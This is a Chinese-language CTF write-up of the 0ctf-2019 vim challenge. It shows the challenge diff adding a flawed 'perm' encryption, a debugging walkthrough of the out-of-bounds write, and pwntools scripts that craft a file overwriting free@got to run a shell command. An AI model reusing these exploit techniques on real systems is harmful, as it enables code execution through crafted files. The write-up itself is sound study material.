# if_on_a_winter_night

[题目](<https://github.com/ctf-challenges/0ctf-2019>)提供了一个vim的diff文件，应该是找到diff后的漏洞了

先看看diff了啥

```c
diff --git a/src/Makefile b/src/Makefile
index 38bb1090d..00023892e 100644
--- a/src/Makefile
+++ b/src/Makefile
@@ -1582,6 +1582,7 @@ BASIC_SRC = \
 	buffer.c \
 	charset.c \
 	crypt.c \
+	crypt_perm.c \
 	crypt_zip.c \
 	dict.c \
 	diff.c \
@@ -1695,6 +1696,7 @@ OBJ_COMMON = \
 	objects/buffer.o \
 	objects/blowfish.o \
 	objects/crypt.o \
+	objects/crypt_perm.o \
 	objects/crypt_zip.o \
 	objects/dict.o \
 	objects/diff.o \
@@ -1820,6 +1822,7 @@ PRO_AUTO = \
 	buffer.pro \
 	charset.pro \
 	crypt.pro \
+	crypt_perm.pro \
 	crypt_zip.pro \
 	dict.pro \
 	diff.pro \
@@ -1993,7 +1996,7 @@ CCC = $(CCC_NF) $(ALL_CFLAGS)
 # A shell script is used to try linking without unnecessary libraries.
 $(VIMTARGET): auto/config.mk objects $(OBJ) version.c version.h
 	$(CCC) version.c -o objects/version.o
-	@LINK="$(PURIFY) $(SHRPENV) $(CClink) $(ALL_LIB_DIRS) $(LDFLAGS) \
+	@LINK="$(PURIFY) $(SHRPENV) $(CClink) $(ALL_LIB_DIRS) $(LDFLAGS) -no-pie \
 		-o $(VIMTARGET) $(OBJ) $(ALL_LIBS)" \
 		MAKE="$(MAKE)" LINK_AS_NEEDED=$(LINK_AS_NEEDED) \
 		sh $(srcdir)/link.sh
@@ -2957,6 +2960,9 @@ objects/charset.o: charset.c
 objects/crypt.o: crypt.c
 	$(CCC) -o $@ crypt.c
 
+objects/crypt_perm.o: crypt_perm.c
+	$(CCC) -o $@ crypt_perm.c
+
 objects/crypt_zip.o: crypt_zip.c
 	$(CCC) -o $@ crypt_zip.c
 
@@ -3410,6 +3416,10 @@ objects/crypt.o: crypt.c vim.h protodef.h auto/config.h feature.h os_unix.h \
  auto/osdef.h ascii.h keymap.h term.h macros.h option.h beval.h \
  proto/gui_beval.pro structs.h regexp.h gui.h alloc.h ex_cmds.h spell.h \
  proto.h globals.h farsi.h arabic.h
+objects/crypt_perm.o: crypt_perm.c vim.h protodef.h auto/config.h feature.h \
+ os_unix.h auto/osdef.h ascii.h keymap.h term.h macros.h option.h beval.h \
+ proto/gui_beval.pro structs.h regexp.h gui.h alloc.h ex_cmds.h spell.h \
+ proto.h globals.h farsi.h arabic.h
 objects/crypt_zip.o: crypt_zip.c vim.h protodef.h auto/config.h feature.h \
  os_unix.h auto/osdef.h ascii.h keymap.h term.h macros.h option.h beval.h \
  proto/gui_beval.pro structs.h regexp.h gui.h alloc.h ex_cmds.h spell.h \
diff --git a/src/crypt.c b/src/crypt.c
index dfbf02ca5..902183ab1 100644
--- a/src/crypt.c
+++ b/src/crypt.c
@@ -119,6 +119,20 @@ static cryptmethod_T cryptmethods[CRYPT_M_COUNT] = {
 	crypt_blowfish_encode, crypt_blowfish_decode,
     },
 
+    /* Permutation; very very weak */
+    {
+	"perm",
+	"VimCrypt~04!",
+	0,
+	0,
+	FALSE,
+	FALSE,
+	NULL,
+	crypt_perm_init,
+	crypt_perm_encode, crypt_perm_decode,
+	NULL, NULL,
+	crypt_perm_encode, crypt_perm_decode,
+    },
     /* NOTE: when adding a new method, use some random bytes for the magic key,
      * to avoid that a text file is recognized as encrypted. */
 };
@@ -528,10 +542,10 @@ crypt_get_key(
     {
 	cmdline_star = TRUE;
 	cmdline_row = msg_row;
-	p1 = getcmdline_prompt(NUL, round == 0
-		? (char_u *)_("Enter encryption key: ")
-		: (char_u *)_("Enter same key again: "), 0, EXPAND_NOTHING,
-		NULL);
+	// to avoid interactive step, without loss of generality
+	p1 = alloc(8);
+	p1[0] = 'a';
+	p1[1] = NUL;
 	cmdline_star = FALSE;
 
 	if (p1 == NULL)
diff --git a/src/crypt_perm.c b/src/crypt_perm.c
index e69de29bb..96caa691f 100644
--- a/src/crypt_perm.c
+++ b/src/crypt_perm.c
@@ -0,0 +1,207 @@
+/* vi:set ts=8 sts=4 sw=4 noet:
+ *
+ * VIM - Vi IMproved	by Bram Moolenaar
+ *
+ * Do ":help uganda"  in Vim to read copying and usage conditions.
+ * Do ":help credits" in Vim to see a list of people who contributed.
+ * See README.txt for an overview of the Vim source code.
+ */
+
+/*
+ * crypt_perm.c: Permutation encryption support.
+ */
+#include "vim.h"
+
+#if defined(FEAT_CRYPT) || defined(PROTO)
+// "...literature itself is merely the permutation of a finite set of elements and functions..."
+// "...but constantly straining to escape from the bonds of this finite quantity..."
+/* 
+ * Just a weird homemade permutation algorithm. 
+ * At least it's reversible.
+ * TODO: Add support for large file. Currently it only works for small file.
+ */
+
+/* The state of encryption, referenced by cryptstate_T. */
+typedef struct {
+    int key;
+    int shift;
+    int step;
+    int orig_size;
+    int size;
+    int cur_idx;
+    char_u *buffer;
+} perm_state_T;
+
+    int
+is_prime(int p)
+{
+    // since p should be small
+    int tmp;
+    tmp = 2;
+    while (tmp*tmp<=p)
+    {
+        if (p%tmp==0)
+            return FALSE;
+        tmp++;
+    }
+    return TRUE;
+}
+
+    void
+crypt_perm_init(
+    cryptstate_T    *state,
+    char_u	    *key,
+    char_u	    *salt UNUSED,
+    int		    salt_len UNUSED,
+    char_u	    *seed UNUSED,
+    int		    seed_len UNUSED)
+{
+    char_u	*p;
+    perm_state_T	*ps;
+
+    ps = (perm_state_T *)alloc(sizeof(perm_state_T));
+    ps->key = 0;
+    state->method_state = ps;
+
+    for (p = key; *p != NUL; ++p)
+    {
+    ps->key = 131*ps->key + *p;
+    }
+}
+
+    void
+crypt_perm_encode(
+    cryptstate_T *state,
+    char_u	*from,
+    size_t	len,
+    char_u	*to)
+{
+    perm_state_T *ps = state->method_state;
+    size_t	i;
+
+    /* 
+     * A dirty way to introduce IV: using the first 4 bytes and keeping them unchanged 
+     */
+    if (len<=4)
+    {
+        for (i = 0; i < len; ++i)
+            to[i] = from[i];
+        return;
+    }
+
+    unsigned int iv;
+
+    for (i = 0; i < 4; ++i)
+    {
+        to[i] = from[i];
+        iv = (iv<<8) + from[i];
+    }
+    ps->orig_size = len-4;
+    ps->size = ps->orig_size;
+    /* We need a prime order for reversibility */
+    while (!is_prime(ps->size))
+        ps->size++;
+
+    ps->shift = ps->key % (len-4);
+    if (ps->shift > 0)
+        ps->buffer = alloc(ps->shift);
+    /* Xor with iv so that we have different value for addition and multiplication */
+    ps->step = ps->key ^ iv;
+    /* Do not forget the corner case */
+    if (ps->step % ps->size == 0)
+        ps->step++;
+    ps->cur_idx = 0;
+
+    /* Step 1: Addition */
+    for (i = 0; i < ps->shift; ++i)
+        ps->buffer[i] = from[len-ps->shift+i];
+    for (i = len-1; i >= 4+ps->shift; --i)
+        from[i] = from[i-ps->shift];
+    for (i = 0; i < ps->shift; ++i)
+        from[i+4] = ps->buffer[i];
+
+    /* Step 2: Multiplication */
+    i = 4;
+    while (i < len)
+    {
+        if (ps->cur_idx < ps->orig_size)
+        {
+            to[i] = from[ps->cur_idx+4];
+            i++;
+        }
+        ps->cur_idx = (ps->cur_idx+ps->step)%ps->size;
+    }
+
+    /* We should recover the "from" array */
+    for (i = 0; i < ps->shift; ++i)
+        ps->buffer[i] = from[i+4];
+    for (i = 4+ps->shift; i < len; ++i)
+        from[i-ps->shift] = from[i];
+    for (i = 0; i < ps->shift; ++i)
+        from[len-ps->shift+i] = ps->buffer[i];
+
+    if (ps->shift > 0)
+        vim_free(ps->buffer);
+}
+
+    void
+crypt_perm_decode(
+    cryptstate_T *state,
+    char_u	*from,
+    size_t	len,
+    char_u	*to)
+{
+    perm_state_T *ps = state->method_state;
+    size_t	i;
+
+    if (len<=4)
+    {
+        for (i = 0; i < len; ++i)
+            to[i] = from[i];
+        return;
+    }
+
+    unsigned int iv;
+    for (i = 0; i < 4; ++i)
+    {
+        to[i] = from[i];
+        iv = (iv<<8) + from[i];
+    }
+    ps->orig_size = len-4;
+    ps->size = ps->orig_size;
+    while (!is_prime(ps->size))
+        ps->size++;
+
+    ps->shift = ps->key % (len-4);
+    if (ps->shift > 0)
+        ps->buffer = alloc(ps->shift);
+    ps->step = ps->key ^ iv;
+    if (ps->step % ps->size == 0)
+        ps->step++;
+    ps->cur_idx = 0;
+
+    /* Step 1: Inverse of Multiplication */
+    i = 4;
+    while (i < len)
+    {
+        if (ps->cur_idx < ps->orig_size)
+        {
+            to[ps->cur_idx+4] = from[i];
+            i++;
+        }
+        ps->cur_idx = (ps->cur_idx+ps->step)%ps->size;
+    }
+
+    /* Step 2: Inverse of Addition */
+    for (i = 0; i < ps->shift; ++i)
+        ps->buffer[i] = to[i+4];
+    for (i = 4+ps->shift; i < len; ++i)
+        to[i-ps->shift] = to[i];
+    for (i = 0; i < ps->shift; ++i)
+        to[len-ps->shift+i] = ps->buffer[i];
+
+    if (ps->shift > 0)
+        vim_free(ps->buffer);
+}
+
+#endif /* FEAT_CRYPT */
diff --git a/src/memline.c b/src/memline.c
index eaa3b65ab..0e4082ead 100644
--- a/src/memline.c
+++ b/src/memline.c
@@ -64,12 +64,14 @@ typedef struct pointer_entry	PTR_EN;	    /* block/line-count pair */
 #define BLOCK0_ID1_C0  'c'		    /* block 0 id 1 'cm' 0 */
 #define BLOCK0_ID1_C1  'C'		    /* block 0 id 1 'cm' 1 */
 #define BLOCK0_ID1_C2  'd'		    /* block 0 id 1 'cm' 2 */
+#define BLOCK0_ID1_C3  'D'		    /* block 0 id 1 'cm' 3 */
 
 #if defined(FEAT_CRYPT)
 static int id1_codes[] = {
     BLOCK0_ID1_C0,  /* CRYPT_M_ZIP */
     BLOCK0_ID1_C1,  /* CRYPT_M_BF */
     BLOCK0_ID1_C2,  /* CRYPT_M_BF2 */
+    BLOCK0_ID1_C3,  /* CRYPT_M_PERM */
 };
 #endif
 
@@ -914,7 +916,8 @@ ml_check_b0_id(ZERO_BL *b0p)
 	    || (b0p->b0_id[1] != BLOCK0_ID1
 		&& b0p->b0_id[1] != BLOCK0_ID1_C0
 		&& b0p->b0_id[1] != BLOCK0_ID1_C1
-		&& b0p->b0_id[1] != BLOCK0_ID1_C2)
+		&& b0p->b0_id[1] != BLOCK0_ID1_C2
+		&& b0p->b0_id[1] != BLOCK0_ID1_C3)
 	    )
 	return FAIL;
     return OK;
diff --git a/src/option.c b/src/option.c
index 3ab355f6c..4d4563bbd 100644
--- a/src/option.c
+++ b/src/option.c
@@ -3245,7 +3245,7 @@ static char *(p_bg_values[]) = {"light", "dark", NULL};
 static char *(p_nf_values[]) = {"bin", "octal", "hex", "alpha", NULL};
 static char *(p_ff_values[]) = {FF_UNIX, FF_DOS, FF_MAC, NULL};
 #ifdef FEAT_CRYPT
-static char *(p_cm_values[]) = {"zip", "blowfish", "blowfish2", NULL};
+static char *(p_cm_values[]) = {"zip", "blowfish", "blowfish2", "perm", NULL};
 #endif
 #ifdef FEAT_CMDL_COMPL
 static char *(p_wop_values[]) = {"tagfile", NULL};
diff --git a/src/proto.h b/src/proto.h
index 92d971469..ccf97c4f2 100644
--- a/src/proto.h
+++ b/src/proto.h
@@ -60,6 +60,7 @@ extern int _stricoll(char *a, char *b);
 # ifdef FEAT_CRYPT
 #  include "blowfish.pro"
 #  include "crypt.pro"
+#  include "crypt_perm.pro"
 #  include "crypt_zip.pro"
 # endif
 # include "buffer.pro"
diff --git a/src/proto/crypt_perm.pro b/src/proto/crypt_perm.pro
index e69de29bb..2e0c27eea 100644
--- a/src/proto/crypt_perm.pro
+++ b/src/proto/crypt_perm.pro
@@ -0,0 +1,5 @@
+/* crypt_perm.c */
+void crypt_perm_init(cryptstate_T *state, char_u *key, char_u *salt, int salt_len, char_u *seed, int seed_len);
+void crypt_perm_encode(cryptstate_T *state, char_u *from, size_t len, char_u *to);
+void crypt_perm_decode(cryptstate_T *state, char_u *from, size_t len, char_u *to);
+/* vim: set ft=c : */
diff --git a/src/structs.h b/src/structs.h
index 0f37b8f66..ab72e7979 100644
--- a/src/structs.h
+++ b/src/structs.h
@@ -1907,7 +1907,8 @@ typedef struct {
 # define CRYPT_M_ZIP	0
 # define CRYPT_M_BF	1
 # define CRYPT_M_BF2	2
-# define CRYPT_M_COUNT	3 /* number of crypt methods */
+# define CRYPT_M_PERM	3
+# define CRYPT_M_COUNT	4 /* number of crypt methods */
 #endif
 
```

可以看到应该是加了一种新的加密方式，如果要编辑的文件以`VimCrypt~`开始的话，`vim`会加密这个文件（我也不是很清楚，:help encryption可以看看

```c
An encrypted file can be recognized by the "file" command, if you add these
lines to "/etc/magic", "/usr/share/misc/magic" or wherever your system has the
"magic" file:
     0  string  VimCrypt~       Vim encrypted file
     >9 string  01      - "zip" cryptmethod
     >9 string  02      - "blowfish" cryptmethod
     >9 string  03      - "blowfish2" cryptmethod

Notes:
```
我们要调用到这个`perm`的加密方式文件的`magic`应该为`VimCrypt~04!`,diff文件里也有了，然后是

```c
-	p1 = getcmdline_prompt(NUL, round == 0
-		? (char_u *)_("Enter encryption key: ")
-		: (char_u *)_("Enter same key again: "), 0, EXPAND_NOTHING,
-		NULL);
+	// to avoid interactive step, without loss of generality
+	p1 = alloc(8);
+	p1[0] = 'a';
+	p1[1] = NUL;
```

为了避免交互，好像`key`默认为了`"a"` ,对`vim`不是很熟悉，所以还是动态边调试边理解吧

先确认下`key`是不是`"a"`,我把断点下在了`crypt_get_key`函数，听这函数名应该是取`key`的操作了

```c
RAX  0x923460 —▸ 0x7ffff7600061 (_IO_obstack_jumps+1) ◂— 0x0
 RBX  0x0
 RCX  0xa
 RDX  0x0
 RDI  0x0
 RSI  0x8cf2c0 (mybuf) ◂— 0x0
 R8   0x1
 R9   0x0
 R10  0x8da010 ◂— 0x101000001010002
 R11  0x0
 R12  0x403e80 (_start) ◂— xor    ebp, ebp
 R13  0x7fffffffdfb0 ◂— 0x3
 R14  0x0
 R15  0x0
 RBP  0x7fffffffd970 —▸ 0x7fffffffdd70 —▸ 0x7fffffffde30 —▸ 0x7fffffffde60 —▸ 0x7fffffffde90 ◂— ...
 RSP  0x7fffffffd918 —▸ 0x4a6a6e (check_for_cryptkey+261) ◂— mov    qword ptr [rbp - 0x28], rax
 RIP  0x4141d6 (crypt_get_key+352) ◂— ret    
─────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────────────────────────────────────────
   0x4141c5 <crypt_get_key+335>         mov    rax, qword ptr [rbp - 8]
   0x4141c9 <crypt_get_key+339>         mov    rdi, rax
   0x4141cc <crypt_get_key+342>         call   crypt_free_key <0x413fe4>
 
   0x4141d1 <crypt_get_key+347>         mov    rax, qword ptr [rbp - 0x10]
   0x4141d5 <crypt_get_key+351>         leave  
 ► 0x4141d6 <crypt_get_key+352>         ret             <0x4a6a6e; check_for_cryptkey+261>

```

看这样子`key`应该就是`"a"`了

然后漏洞点是

```
 /* Step 2: Multiplication */
+	 i = 4;
+    while (i < len)
+    {
+        if (ps->cur_idx < ps->orig_size)
+        {
+            to[ps->cur_idx+4] = from[i];
+            i++;
+        }
+        ps->cur_idx = (ps->cur_idx+ps->step)%ps->size;
+    }
```

`ps->step`是由`ps->key^IV`来的，而`IV`我们是可控的，所以我们可以让`ps->step`为负数，这样就可以向上写

通过动态调试

```
 RAX  0x41
 RBX  0x0
 RCX  0x90dac4 ◂— 0x4141414141414141 ('AAAAAAAA')
 RDX  0x90d684 ◂— 0xf7603ca000007fff

  0x4148eb <crypt_perm_decode+434>    cdqe   
   0x4148ed <crypt_perm_decode+436>    lea    rdx, [rax + 4]
   0x4148f1 <crypt_perm_decode+440>    mov    rax, qword ptr [rbp - 0x40]
   0x4148f5 <crypt_perm_decode+444>    add    rdx, rax
   0x4148f8 <crypt_perm_decode+447>    movzx  eax, byte ptr [rcx]
 ► 0x4148fb <crypt_perm_decode+450>    mov    byte ptr [rdx], al
   0x4148fd <crypt_perm_decode+452>    add    qword ptr [rbp - 0x10], 1
   0x414902 <crypt_perm_decode+457>    mov    rax, qword ptr [rbp - 8]
   0x414906 <crypt_perm_decode+461>    mov    edx, dword ptr [rax + 0x14]
   0x414909 <crypt_perm_decode+464>    mov    rax, qword ptr [rbp - 8]
   0x41490d <crypt_perm_decode+468>    mov    eax, dword ptr [rax + 8]
──────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────
00:0000│ rsp  0x7fffffffd8f0 —▸ 0x90d680 ◂— 0x7fff9effffff
01:0008│      0x7fffffffd8f8 ◂— 0x24 /* '$' */
02:0010│      0x7fffffffd900 —▸ 0x90dac0 ◂— 0x414141419effffff
03:0018│      0x7fffffffd908 —▸ 0x90d560 ◂— 0x3
04:0020│      0x7fffffffd910 —▸ 0x7fffffffd930 —▸ 0x7fffffffd970 —▸ 0x7fffffffdd60 —▸ 0x7fffffffde20 ◂— ...
05:0028│      0x7fffffffd918 ◂— 0xffffff9e004f68d6
06:0030│      0x7fffffffd920 ◂— 0x4
07:0038│      0x7fffffffd928 —▸ 0x90d650 ◂— 0x100000061 /* 'a' */ <---ps
```
`RDX为to[ps->cur_idx+4]`，这里的地址距离`ps->buf`很近，相差`0x15`个字节，所以我们可以向上把`ps->buf`覆盖为`free@got`的上方，然后
```c
 /* Step 2: Inverse of Addition */
+    for (i = 0; i < ps->shift; ++i)
+        ps->buffer[i] = to[i+4];
```
在依靠这个改写`free@got`

需要注意的是，要控制好文件的长度，让`to`数组刚刚好分配在`ps`的下方才可以

最终exp为

```
from pwn import *
import struct
def main():
	f = open("slove","wb")
	magic_header = "VimCrypt~04!"
	payload = struct.pack(">i",-1^0x61) #iv ^ key
	payload += "A"*0x15+p64(free_got-8)[::-1]
	payload += "\x33" #overwrite current_idx
	payload += "\x00"*0x11
	payload += p64(call_shell)[::-1]
	payload += ";cat fl*"[::-1]
	payload = payload.ljust(0x50,"\x00")
	f.write(magic_header+payload)
	f.close()
	p = process(["./vim","--clean","./slove"])
	gdb.attach(p,"b *0x000000000414A21")
	p.interactive()

if __name__ == "__main__":
	free_got = 0x0000000008A8238
	call_shell = 0x0000000004F93DB
	main()
```

但是一直不知道为什么打不通，会一直显示

```
bin/bash: -c: line 1: syntax error: unexpected end of file

shell returned 1
/bin/bash: $'\320\3311\001': command not found

shell returned 127
/bin/bash: $'@\3321\001': command not found

shell returned 127
/bin/bash: $'\260\3321\001': command not found

```

唉

后来有去看了balsn的wp，把free@got改成了0x4c915d

```
.text:00000000004C915D                 mov     r8d, 0
.text:00000000004C9163                 mov     rcx, rax
.text:00000000004C9166                 lea     rdx, aC_2       ; "-c"
.text:00000000004C916D                 lea     rsi, arg        ; "sh"
.text:00000000004C9174                 lea     rdi, path       ; "/bin/sh"
.text:00000000004C917B                 mov     eax, 0
.text:00000000004C9180                 call    _execl
```

`free`的时候`rax`指向`ps->buffer`

所以把exp改成了

```
from pwn import *
import struct
def main():
	f = open("slove","wb")
	magic_header = "VimCrypt~04!"
	payload = struct.pack(">i",-1^0x61) #iv ^ key
	payload += "A"*0x15+p64(free_got-8)[::-1]
	payload += "\x33" #overwrite current_idx
	payload += "\x00"*0x11
	payload += p64(shell)[::-1]
	payload += "cat fl*\x00"[::-1]
	payload = payload.ljust(0x50,"\x00")
	f.write(magic_header+payload)
	f.close()

if __name__ == "__main__":
	free_got = 0x0000000008A8238
	# call_shell = 0x0000000004F93DB
	shell = 0x4c915d
	main()
```

然后：

```
ruan@ubuntu:/mnt/hgfs/shared/tctf/0ctf-2019-master/0ctf-2019-master/pwn/if_on_a_winters_night/release$ ./vim --clean slove :q

Need encryption key for "slove"flag{yesyesyesyesyesyes---=-==-=-(^_^)}
                                                                     ruan@ubuntu:/mnt/hgfs/shared/tctf/0ctf-2019-master/0ctf-2019-master/pwn/if_on_a_winters_night/release$ 

```
但是远程打不通，wtcl，调了好久也没发现啥问题。唉

参考链接：

[https://blog.bushwhackers.ru/0ctf-quals-2019-vim/](https://blog.bushwhackers.ru/0ctf-quals-2019-vim/)

[https://balsn.tw/ctf_writeup/20190323-0ctf_tctf2019quals/#if-on-a-winters-night-a-traveler](https://balsn.tw/ctf_writeup/20190323-0ctf_tctf2019quals/#if-on-a-winters-night-a-traveler)



